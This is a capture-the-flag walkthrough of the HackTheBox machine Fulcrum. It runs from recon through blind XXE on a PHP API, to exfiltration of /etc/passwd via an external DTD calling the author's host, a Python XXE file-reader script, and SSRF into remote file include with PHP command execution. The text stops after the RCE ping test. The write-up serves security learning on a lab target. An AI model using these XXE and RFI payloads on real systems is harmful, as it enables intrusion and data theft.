---
title: HTB: Fulcrum
url: https://0xdf.gitlab.io/2022/05/11/htb-fulcrum.html
date: 2022-05-11T09:00:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, hackthebox, htb-fulcrum, nmap, ubuntu, windows, feroxbuster, api, xxe, burp, burp-repeater, python, ssrf, rfi, qemu, tunnel, powershell, powershell-credential, chisel, evil-winrm, web.config, ldap, powerview, credentials, htb-reel, htb-omni, oswe-like
---

![Fulcrum](https://0xdfimages.gitlab.io/img/fulcrum-cover.png)

Fulcrum is a 2017 release that got a rebuild in 2022. It’s a Linux server with four websites, including one that returns Windows .NET error messages. I’ll exploit an API endpoint via XXE, and use that as an SSRF to get execution through a remote file include. From there I’ll pivot to the Windows webserver with some credentials, enumeration LDAP, pivot to the file server, which can read shares on the DC. In those shares, I’ll find a login script with creds associated with one of the domain admins, and use that to read the flag from the DC, as well as to get a shell. This box has a lot of tunneling, representing a small mixed-OS network on one box.

## Box Info

| Name | [Fulcrum](https://hackthebox.com/machines/fulcrum)  [Fulcrum](https://hackthebox.com/machines/fulcrum) [Play on HackTheBox](https://hackthebox.com/machines/fulcrum) |
| --- | --- |
| Release Date | [25 Nov 2017](https://twitter.com/hackthebox_eu/status/933632948255027200) |
| Retire Date | 09 Jun 2018 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Fulcrum |
| Radar Graph | Radar chart for Fulcrum |
| First Blood User | 2 days00:51:34[echthros echthros](https://app.hackthebox.com/users/2846) |
| First Blood Root | 2 days14:39:18[echthros echthros](https://app.hackthebox.com/users/2846) |
| Creator | [bashlogic bashlogic](https://app.hackthebox.com/users/1545) |

## Recon

### nmap

`nmap` finds six open TCP ports, including five HTTP servers on weird ports (4, 80, 88, 9999, 56423) and SSH (22):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.10.62
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-11 09:52 UTC
Warning: 10.10.10.62 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.62
Host is up (0.14s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
4/tcp     open  unknown
22/tcp    open  ssh
80/tcp    open  http
88/tcp    open  kerberos-sec
9999/tcp  open  abyss
56423/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
oxdf@hacky$ nmap -p 4,22,80,88,9999,56423 -sCV 10.10.10.62
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-11 09:52 UTC
Nmap scan report for 10.10.10.62
Host is up (0.093s latency).

PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
88/tcp    open  http    nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: phpMyAdmin
9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
56423/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: Fulcrum-API Beta
|_http-title: Site doesn't have a title (application/json;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.67 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal, which is very strange for a box released in November 2017. This box was a getting a bunch of bad reviews due to stability, and the team recently rebuilt it to have all the same vectors, but on a bit more modern technology, which is why the OS is newer than the box. This Changelog is on the HTB [page for Fulcrum](https://app.hackthebox.com/machines/Fulcrum/changelog):

![image-20220429062615591](https://0xdfimages.gitlab.io/img/image-20220429062615591.png)

My notes from 2018 show `OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)`, which would be Ubuntu 16.04 xenial.

All five webservers are running the same version of NGINX.

### Website - TCP 4

#### Site

Nothing much here:

![image-20220428171808774](https://0xdfimages.gitlab.io/img/image-20220428171808774.png)

The link leads to `/index.php?page=home`, which loads the same page.

I’ll play around with trying to get it to include other pages, but nothing seems to change. Giving it `page=http://10.10.14.6/test`, hoping it might try to load `test.php` from my server, fails as well. I’ll also try a parameter brute force on `page` to see if there’s something there:

```

oxdf@hacky$ wfuzz -u http://10.10.10.62:4/index.php?page=FUZZ -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 110
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.62:4/index.php?page=FUZZ
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

Total time: 66.96967
Processed Requests: 2588
Filtered Requests: 2588
Requests/sec.: 38.64435

```

Nothing there.

#### Tech Stack

Nothing interesting in the response headers. From the `index.php,` the site is running PHP.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.62:4 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.62:4
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        6w        0c http://10.10.10.62:4/
200      GET       13l       27w        0c http://10.10.10.62:4/home.php
200      GET        1l        6w        0c http://10.10.10.62:4/index.php
200      GET        1l        6w        0c http://10.10.10.62:4/upload.php
[####################] - 3m    120000/120000  0s      found:4       errors:0      
[####################] - 3m     60000/60000   261/s   http://10.10.10.62:4 
[####################] - 3m     60000/60000   261/s   http://10.10.10.62:4/ 

```

#### home/upload

Visiting `/upload.php` returns an error message:

![image-20220428172312011](https://0xdfimages.gitlab.io/img/image-20220428172312011.png)

`/home.php` has a form that POSTs to `/upload`. Still, no matter what kind of file I attach, the same error message comes back. Don’t see much else I can do with this at this point.

### Website - TCP 80

#### Site

Visiting this webserver returns a Microsoft ASP.NET error message:

![image-20220428172813965](https://0xdfimages.gitlab.io/img/image-20220428172813965.png)

This is strange, as it’s a Linux box. This is a hint as to the Windows VMs I’ll encounter later.

#### Tech Stack

The response headers show the same NGINX headers as port 4:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 28 Apr 2022 21:27:31 GMT
Content-Type: text/html
Connection: close
Last-Modified: Sun, 13 Feb 2022 07:42:52 GMT
ETag: W/"066264ead20d81:0"
Content-Length: 5252

```

It seems like either this page is just being faked, or NGINX is proxying to a Windows host.

No `index.` that I guessed returned anything but 404, including `.html`, `.aspx`, `.asp`, and `.php`.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x aspx,asp` to look for Windows .NET like things:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.62 -x asp,aspx

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.62
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [asp, aspx]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[####################] - 8m     89997/89997   0s      found:0       errors:0      
[####################] - 8m     89997/89997   174/s   http://10.10.10.62

```

Nothing here. Moving on.

### Website - TCP 88

#### Site

This is an login page for phpMyAdmin:

![image-20220428173617368](https://0xdfimages.gitlab.io/img/image-20220428173617368.png)

[phpMyAdmin](https://www.phpmyadmin.net/) is a web interface to administer MySQL instances.

Trying to guess some basic passwords like admin / admin returns errors about failing to connect to MySQL:

![image-20220428173728089](https://0xdfimages.gitlab.io/img/image-20220428173728089.png)

This seems kind of like a rabbithole.

#### Tech Stack

Nothing here different from TCP 4 - NGINX and not much else.

phpMyAdmin is written in PHP, and the login POST is sent to `index.php`.

Given that this is an instance of real software, I’m going to hold off on the directory brute force for now. I could come back to this if I get stuck elsewhere.

### Website - TCP 9999

This port behaves exactly like port 80. Looking at my notes from 2018, this is where PFSense used to be, but the changelog reported that it was no longer present. Perhaps it now just points at the same port 80 page.

### Website - TCP 56423

#### Site

`http://10.10.10.62:56423` returns JSON data:

![image-20220429062918833](https://0xdfimages.gitlab.io/img/image-20220429062918833.png)

This looks like some kind of API.

#### Tech Stack

The HTTP response looks different from the others:

```

HTTP/1.1 200 OK
Date: Fri, 29 Apr 2022 10:28:51 GMT
Content-Type: application/json;charset=utf-8
Connection: close
Server: Fulcrum-API Beta
Content-Length: 31

{"Heartbeat":{"Ping":"Pong"}}

```

No NGINX (I wonder where `nmap` got that from? Perhaps it’ll add that header on a 404 or something else.) The `Server` is `Fulcrum-API Beta`.

#### Endpoint Brute Force

I’ll run `feroxbuster` against the API, making sure to test different types of requests 404 and 405 seem to come for the default cases, so I’ll filter those responses with `-C 404,405`:

```

oxdf@hacky$ feroxbuster -u http://10.10.10.62:56423 -m GET,POST,PUT,DELETE -C 404,405

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.62:56423
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 🏁  HTTP methods          │ [GET, POST, PUT, DELETE]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        2l        1w        0c http://10.10.10.62:56423/
200     POST        2l        1w        0c http://10.10.10.62:56423/
[####################] - 4m    240000/240000  0s      found:2       errors:0      
[####################] - 4m    120000/120000  453/s   http://10.10.10.62:56423 
[####################] - 4m    120000/120000  453/s   http://10.10.10.62:56423/ 

```

It does identify that POST to `/` returns something, but it looks like the same response as GET, which I’ll confirm with `curl`:

```

oxdf@hacky$ curl http://10.10.10.62:56423
{"Heartbeat":{"Ping":"Pong"}}

oxdf@hacky$ curl -X POST http://10.10.10.62:56423
{"Heartbeat":{"Ping":"Pong"}}

```

## Shell as www-data [Fulcrum]

### XXE

#### Strategy

At this point, I don’t have much to work with. I have a good feeling that I need to poke more at the API, since that’s clearly custom code. I’ll want to try to send it different kinds of input, like HTTP arguments, JSON, and even XML.

I don’t think you’ll see anything like this on HTB today. It’d be considered too guessy, and there would be more hints as to what the right path is.

#### Find XML Response

I’ll send the GET to Repeater and play around with it a bit. I’ll try a handful of payloads, starting with the payload that comes back:

```

{"Heartbeat":{"Ping":"Pong"}}

```

I’ll try changing `Pong` to different things, like `Ping` and `0xdf` and `whoami`. Nothing changes.

I can also try it like this, doing the same different values:

```

Heartbeat[Ping]=Pong

```

Still nothing.

For XML, I’ll try:

```

<Heartbeat><Ping>Pong</Ping></Heartbeat>

```

Nothing changes, but when I change `Pong` to `Ping`, there’s a subtle change:

[![image-20220429120556568](https://0xdfimages.gitlab.io/img/image-20220429120556568.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220429120556568.png)

That’s a signal that I’m going down the right path.

#### POC

Because it seems that the only thing I can get into that output is `Ping` or `Pong`, XXE exploitation would have to be blind. I’ll grab a [blind XXE payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#blind-xxe) from PayloadsAllThethings, and update it a bit to use my host as a URL:

```

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://10.10.14.6/x"> %ext;
]>

```

Sending that, there’s a hit on my Python webserver:

```
10.10.10.62 - - [29/Apr/2022 23:10:49] code 404, message File not found
10.10.10.62 - - [29/Apr/2022 23:10:49] "GET /x HTTP/1.0" 404 -

```

#### File Exfil

In trying a few different POCs from PayloadsAllTheThings, I am able to get [this POC](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013) to exfil a file. I’ll define a local `.dtd` file, and then use XML to load it. So first I’ll make `0xdf.dtd`:

```

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.6/?%file;'>">
%all;

```

This says to base64-encode `/etc/passwd`, and then visit my server with the encoded data as the parameter.

I’ll use this XML in the HTTP POST body:

```

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://10.10.14.6/0xdf.dtd">
<data>&send;</data>

```

It’ll fetch and load the `.dtd` file.

It works:

```
10.10.10.62 - - [29/Apr/2022 23:46:20] "GET /0xdf.dtd HTTP/1.0" 200 -
10.10.10.62 - - [29/Apr/2022 23:46:21] "GET /?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0" 200 -

```

That’s `/etc/passwd`:

```

oxdf@hacky$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg==" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
...[snip]...

```

#### Script

It’s totally unnecessary for the box, but I wrote a Python script to make a little shell to read files:

```

#!/usr/bin/python3

import base64
import logging
import readline
import requests
import threading
import time
from flask import Flask, request

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
prev_data = ""

xml_template = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://10.10.14.6/dtd?fn={}">
<data>&send;</data>"""

@app.route("/dtd")
def dtd():
    fn = request.args['fn']
    return f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={fn}">
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.6/exfil?data=%file;'>">
    %all;"""

@app.route("/exfil")
def data():
    global prev_data
    b64data = request.args['data'].replace(' ', '+') # Flask tries to URL decode it
    print(b64data)
    print(len(b64data))
    data = base64.b64decode(b64data).decode().strip()
    if data != prev_data:
        print(data)
        prev_data = data
    return ""

def web():
    app.run(host="0.0.0.0", port=80)

if __name__ == "__main__":
    threading.Thread(target=web, daemon=True).start()
    time.sleep(1)
    #app.run(debug=True, use_reloader=False, host="0.0.0.0", port=80)
    while True:
        try:
            fn = input("file> ")
            xml = xml_template.format(fn)
            requests.post('http://10.10.10.62:56423', data=xml)
        except KeyboardInterrupt:
            print()

```

It prompts for a file, and then prints the result:

```

oxdf@hacky$ ./xxe_read.py 
 * Serving Flask app 'xxe_read' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
file> /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
file> /proc/self/cmdline
php-fpm: pool www

```

#### Web Source

It’s not at all necessary to read the web source, but I’ll make some efforts, and if I guess right, it’s possible to get the source for both the uploads and api services.

I’ll try to find the NGINX config in `/etc/nginx/sites-enabled/`, but fail. It turns out that the file is named `default`, but it’s too long to come back over a URL. I can guess at the locations of the various webserver roots might be. They are probably in folders in `/var/www`. If I guess that one is called `api`, I can get `index.php`:

```

<?php
        header('Content-Type:application/json;charset=utf-8');
        header('Server: Fulcrum-API Beta');
        libxml_disable_entity_loader (false);
        $xmlfile = file_get_contents('php://input');
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
        $input = simplexml_import_dom($dom);
        $output = $input->Ping;
        //check if ok
        if($output == "Ping")
        {
                $data = array('Heartbeat' => array('Ping' => "Ping"));
        }else{
                $data = array('Heartbeat' => array('Ping' => "Pong"));
        }
        echo json_encode($data);

?>

```

The source for port 4 is in `/var/www/uploads/index.php`:

```

<?php
if($_SERVER['REMOTE_ADDR'] != "127.0.0.1")
{
        echo "<h1>Under Maintance</h1><p>Please <a href=\"http://" . $_SERVER['SERVER_ADDR'] . ":4/index.php?page=home\">try again</a> later.</p>";
}else{
        $inc = $_REQUEST["page"];
        include($inc.".php");
}
?>

```

If the requesting address isn’t localhost, it just returns the static page. But if it is, it includes like I expected above.

### SSRF

#### Strategy

If I do manage to get the source for the port 4 service, it’s clear that there’s a local file include vulnerability, and a potential remote file include vulnerability there.

Seeing the uploads source took a lot of guessing. I think most people also just guessed at trying it without seeing the source with the following logic. I noticed during enumeration of port 4 that there was a class PHP structure that looks like a file include: `/index.php?page=home`. In PHP (more in 2018 than 2022, but still), it’s common to have some code that reads the `page` argument and then includes `$_REQUEST['page'] . php`. Above I did fuzz that a bit with no result. But it might be worth just trying it anyway with the XXE to see if it behaves differently when the request is coming from localhost.

#### POC

This HTTP body will trigger the SSRF over the XXE:

```

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://localhost:4/?page=http://10.10.14.6/0xdf">
<data>&send;</data>

```

Instead of loading the DTD file from my host, it’s just hitting the page on TCP 4. On sending, there’s a request at my Python webserver:

```
10.10.10.62 - - [30/Apr/2022 10:29:32] code 404, message File not found
10.10.10.62 - - [30/Apr/2022 10:29:32] "GET /0xdf.php HTTP/1.0" 404 -

```

The PHP on port 4 is trying to load `0xdf.php` from my server, failing, and then returning an invalid DTD, which causes a failure on port 56423, which seems to land back in the default case of “Pong”.

#### RCE

To test if I can get RCE, I’ll write a really simple PHP file that pings my host:

```

<?php system("ping -c 1 10.10.14.6"); ?>

```

When I resend the request, it fetched from my server:

```
10.10.10.62 - - [30/Apr/2022 10:38:02] "GET /0xdf.php HTTP/1.0" 200 -

```

And then I see ICMP in `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
10:37:37.353354 IP 10.10.10.62 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 64
